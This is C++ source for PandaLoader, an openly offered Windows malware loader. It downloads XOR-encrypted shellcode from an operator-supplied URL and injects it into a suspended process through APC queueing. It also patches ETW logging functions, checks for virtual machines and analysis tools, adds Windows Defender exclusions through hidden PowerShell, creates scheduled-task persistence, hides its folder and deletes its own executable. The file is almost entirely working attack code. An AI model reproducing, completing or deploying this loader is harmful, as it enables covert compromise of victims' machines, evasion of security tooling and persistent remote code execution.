#include <windows.h>
#include <wininet.h>
#include <vector>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <shlwapi.h>
#include "obfusheader.h"
#include <cstring> 
#include <algorithm>
#include <psapi.h>
#include <ctime>
#include <cstdlib>
#pragma comment(lib, "wininet.lib")
#define ENABLE_ADMIN 0 // Mandatory when adding persistence and WD exclusions
#define ADD_EXCLUSION 0 // Optional (Add Windows Defender Exclusions)
#define MELT 0 // Deletes the payload after injection
#define ENABLE_STARTUP 0 // Persist on the machine after reboot
#define SLEEP_DELAY 0   // randomized sleep delays
#define ENABLE_ANTIVM 0  // evade virtualized environments
#define STARTUP_ENTRYNAME OBF("PERSISTENCE_REPLACE_ME") 
#define DIRECTORY_NAME OBF("DIRECTORY_REPLACE_ME") 
#define FILENAME OBF("FILENAME_REPLACE_ME")
#define HIDE_DIRECTORY 0 // Optional
#define XOR_DECRYPTION_KEY OBF("XOR_KEY_REPLACE_ME") // The decryption key for your shellcode
#define SHELLCODE_URL OBF(L"SHELLCODE_URL_REPLACE_ME") // Replace SHELLCODE_URL_REPLACE_ME with your shellcode link 
#define SINGLE_INSTANCE 1 // MUTEX 


/* 
 This file is part of PandaLoader. (https://github.com/Chainski/PandaLoader)
Copyright (c) 2024 CHA1NSK1

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/


typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("WriteProcessMemory"));
typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("QueueUserAPC"));
typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("CreateProcessA"));
typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualAllocEx"));
typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualProtect"));
typedef BOOL(WINAPI* VirtualAllocExNumaFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAddress(GetModuleHandleA(OBF("kernel32.dll")), OBF("VirtualAllocExNuma"));


void junk_code() {
    volatile unsigned long long j = 0xDEADBEEFDEADBEEFULL;
    for (int i = 0; i < 291; ++i) {
        j ^= 0xABCDEF1234567890ULL;
        j = (j << 1) | (j >> 63);
        j += 0x1111111111111111ULL;
    }
}

BOOL ETWPATCH() {
    DWORD oldprotect = 0;
    const char* functions[] = { OBF("EtwEventWrite"), OBF("EtwEventWriteFull"), OBF("EtwEventWriteTransfer"), OBF("EtwRegister")};
    for (int i = 0; i < (sizeof(functions) / sizeof(functions[0])); i++) {
        void* pFunc = (void*)GetProcAddress(GetModuleHandleA(OBF("ntdll.dll")), functions[i]);
        if (!pFunc) continue;
        if (!VirtualProtect(pFunc, 4096, PAGE_EXECUTE_READWRITE, &oldprotect)) return FALSE;
#ifdef _WIN64
        memcpy(pFunc, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
#else
        memcpy(pFunc, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14
#endif
        VirtualProtect(pFunc, 4096, oldprotect, &oldprotect);
        FlushInstructionCache(GetCurrentProcess(), pFunc, 4096);
    }
    return TRUE;
}

BOOL FileExists(const std::wstring& filePath) {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(filePath.c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }
    FindClose(hFind);
    return true;
}

BOOL DirectoryExists(const std::wstring& dirPath) {
    DWORD fileAttrib = GetFileAttributesW(dirPath.c_str());
    return (fileAttrib != INVALID_FILE_ATTRIBUTES && (fileAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL AntiVM() {
    DWORD adwProcesses[1024], dwReturnLen = 0;
    if (EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen)) {
        DWORD dwNmbrOfPids = dwReturnLen / sizeof(DWORD);
        if (dwNmbrOfPids < 104) {
            return TRUE; 
        }
    }
    std::wstring systemRoot(MAX_PATH, L'\0');
    if (GetEnvironmentVariableW(OBF(L"SystemRoot"), &systemRoot[0], MAX_PATH)) {
        systemRoot.resize(wcslen(systemRoot.c_str()));
        std::vector<std::wstring> badFiles = {
        OBF(L"\\drivers\\vmmouse.sys"),
        OBF(L"\\drivers\\vmhgfs.sys"),
        OBF(L"\\drivers\\VBoxMouse.sys"),
        OBF(L"\\drivers\\VBoxGuest.sys"),
        OBF(L"\\drivers\\VBoxSF.sys"),
        OBF(L"\\drivers\\VBoxVideo.sys"),
        OBF(L"\\drivers\\prlfs.sys"),
		OBF(L"\\drivers\\balloon.sys"),
		OBF(L"\\drivers\\netkvm.sys"),
		OBF(L"\\drivers\\viofs.sys"),
		OBF(L"\\drivers\\vioser.sys"),
        OBF(L"\\vboxdisp.dll"),
        OBF(L"\\vboxhook.dll"),
        OBF(L"\\vboxmrxnp.dll"),
        OBF(L"\\vboxogl.dll"),
        OBF(L"\\vboxoglarrayspu.dll"),
        OBF(L"\\vboxoglcrutil.dll"),
        OBF(L"\\vboxoglerrorspu.dll"),
        OBF(L"\\vboxoglfeedbackspu.dll")
        };
        for (const auto& file : badFiles) {
            if (FileExists(systemRoot + OBF(L"\\System32") + file)) {
                return TRUE; 
            }
        }
    }
    std::vector<std::wstring> badDirs = {
        OBF(L"C:\\Program Files\\VMware"),
        OBF(L"C:\\Program Files\\Oracle\\VirtualBox Guest Additions")
    };
    for (const auto& dir : badDirs) {
        if (DirectoryExists(dir)) {
            return TRUE;
        }
    }
    MEMORYSTATUSEX RAMStatus = { sizeof(RAMStatus) };
    GlobalMemoryStatusEx(&RAMStatus);
    if ((RAMStatus.ullTotalPhys / (1024ULL * 1024ULL)) < 6048) {
        return TRUE; 
    }
    std::vector<std::wstring> badProcesses = {
        OBF(L"autorunsc.exe"), 
		OBF(L"binaryninja.exe"), 
		OBF(L"dumpcap.exe"),
        OBF(L"die.exe"), 
		OBF(L"fakenet.exe"), 
		OBF(L"joeboxserver.exe"), 
		OBF(L"processhacker.exe"), 
		OBF(L"procexp.exe"), 
		OBF(L"qga.exe"),
        OBF(L"qemu-ga"), 
		OBF(L"sandman.exe"), 
		OBF(L"sysmon.exe"),
        OBF(L"tcpdump.exe"), 
		OBF(L"sniff_hit.exe"), 
		OBF(L"vboxcontrol.exe"),
        OBF(L"vboxservice.exe"), 
		OBF(L"vboxtray.exe"), 
		OBF(L"vt-windows-event-stream.exe"),
        OBF(L"vmsrvc.exe"), 
		OBF(L"vmwaretray.exe"), 
		OBF(L"vmwareuser.exe"), 
		OBF(L"wireshark.exe"),
        OBF(L"windbg.exe"), 
		OBF(L"xenservice.exe")
    };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32 = { sizeof(PROCESSENTRY32W) };
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                for (const auto& proc : badProcesses) {
                    if (_wcsicmp(pe32.szExeFile, proc.c_str()) == 0) {
                        CloseHandle(hSnapshot);
                        return TRUE; 
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return FALSE; // No VM indicators found
}


void payloadurl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenW(OBF(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS, 0);
    BYTE buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }
    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
}

BOOL admincheck() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
}

std::string get_executable_path() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

BOOL existence(const std::string& directoryName) {
    std::string current_path = get_executable_path();
    std::string::size_type pos = current_path.find(directoryName);
    return (pos != std::string::npos);
}

void delete_current_executable() {
    std::string current_path = get_executable_path();
    std::string command = std::string(OBF("/C choice /C Y /N /D Y /T 3 & Del \"")) + current_path + OBF("\"");
    ShellExecuteA(NULL, OBF("open"), OBF("cmd.exe"), command.c_str(), NULL, SW_HIDE);
}

std::string get_environment_variable(const std::string& varName) {
    char buffer[MAX_PATH];
    DWORD length = GetEnvironmentVariableA(varName.c_str(), buffer, MAX_PATH);
    if (length == 0 || length >= MAX_PATH) {
        return "";
    }
    return std::string(buffer);
}

void hidden(const std::string& directoryPath) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((directoryPath + "\\*").c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }
    do {
        std::string fileName = findFileData.cFileName;
        if (fileName != "." && fileName != "..") {
            std::string fullPath = directoryPath + "\\" + fileName;
            SetFileAttributesA(fullPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                hidden(fullPath);
            }
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);
    FindClose(hFind);
}


BOOL persistence(const std::string& taskName, const std::string& executablePath) {
    std::wstring longPath = std::wstring(executablePath.begin(), executablePath.end());
    std::string command = std::string(OBF("Register-ScheduledTask -TaskName \"")) + taskName +
        std::string(OBF("\" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0) -Action (New-ScheduledTaskAction -Execute '")) +
        std::string(longPath.begin(), longPath.end()) + std::string(OBF("') -Force -RunLevel Highest"));
    HINSTANCE hInst = ShellExecuteA(NULL, OBF("open"), OBF("powershell.exe"), command.c_str(), NULL, SW_HIDE);
    return 0;
}

void persist_folder() {
    std::string systemDrive = get_environment_variable(OBF("SystemDrive"));
    std::string programData = get_environment_variable(OBF("ProgramData"));
    std::string destDir = systemDrive + OBF("\\ProgramData\\") + DIRECTORY_NAME;
    std::string fullFilename = std::string(FILENAME) + OBF(".exe");
    std::string destPath = destDir + "\\" + fullFilename;
    std::string exePath = get_executable_path();
    if (!CreateDirectoryA(destDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        return;
    }
    DeleteFileA(destPath.c_str());
    if (!CopyFileA(exePath.c_str(), destPath.c_str(), FALSE)) {
        return;
    }
    if (HIDE_DIRECTORY) {
        SetFileAttributesA(destDir.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        hidden(destDir);
    }
    persistence(STARTUP_ENTRYNAME, destPath);
}

void XORDecrypt(std::vector<BYTE>& data, const std::string& key) {
    size_t keyLength = key.size();
    for (size_t i = 0; i < data.size(); ++i) {
        data[i] ^= key[i % keyLength];
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
   std::string exePath = get_executable_path();
   junk_code();
   std::wstring exePathW = std::wstring(exePath.begin(), exePath.end());
   ETWPATCH();
   if (ENABLE_ADMIN && !admincheck()) {
        LPCWSTR powershellPath = OBF(L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        WCHAR cmdLine[MAX_PATH];
#ifdef __MINGW32__
        // Use %S for MinGW, which expects a char* (narrow string) and handles it as wide.
        swprintf(cmdLine, MAX_PATH, OBF(L"Start-Process -FilePath '\"%S\"' -Verb runAs"), exePathW.data());
#else
        // Use %s for Visual Studio, which expects a wchar_t* (wide string).
       swprintf(cmdLine, MAX_PATH, OBF(L"Start-Process -FilePath '\"%s\"' -Verb runAs"), exePathW.data());
#endif
       ShellExecuteW(NULL, OBF(L"runas"), powershellPath, cmdLine, NULL, SW_HIDE);
       return 0;
    }
   if (SINGLE_INSTANCE) {
        HANDLE hMutex = CreateMutex(NULL, TRUE, OBF("PANDALOADER"));
        if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }
    }
#if ENABLE_ANTIVM
    if (AntiVM()) {
        ExitProcess(1);
    }
#else
    printf(OBF("AntiVM check is disabled.\n"));
#endif
    if (SLEEP_DELAY) {
        static bool __s = false;
        if (!__s) {
            std::srand(static_cast<unsigned int>(std::time(nullptr)));
            __s = true;
        }
        const int __v[] = {10, 12, 14, 16};          
        int __i = std::rand() % 4;
        int __k = __v[__i];
        std::time_t __t0 = std::time(nullptr);
        volatile unsigned long long __r = 123456789ULL;
        while ((std::time(nullptr) - __t0) < __k) {
            for (unsigned int __j = 0u; __j < 500000u; ++__j) {
                __r ^= static_cast<unsigned long long>(__j + 2718281u);
            }
        }
        (void)__r; 
    }
#if ENABLE_ADMIN
    if (ADD_EXCLUSION) {
        ShellExecute(NULL, OBF("open"), OBF("powershell"), OBF("Add-MpPreference -ExclusionPath @($env:userprofile, $env:programdata) -Force"), NULL, SW_HIDE);
    }
    if (ENABLE_STARTUP && !existence(DIRECTORY_NAME)) {
        persist_folder();
    }
#endif
    std::vector<BYTE> payload;
    LPCWSTR url = SHELLCODE_URL;
    payloadurl(url, payload);
	junk_code();
    std::string key = XOR_DECRYPTION_KEY;
    XORDecrypt(payload, key);
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    pwCreateProcess(OBF("INJECTION_TARGET"), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PVOID pBaseAddress = nullptr;
    SIZE_T* bytesWritten = 0;
    pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);
    pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);
    if (MELT && !existence(DIRECTORY_NAME)) {
        delete_current_executable();
    }
    return 0;

}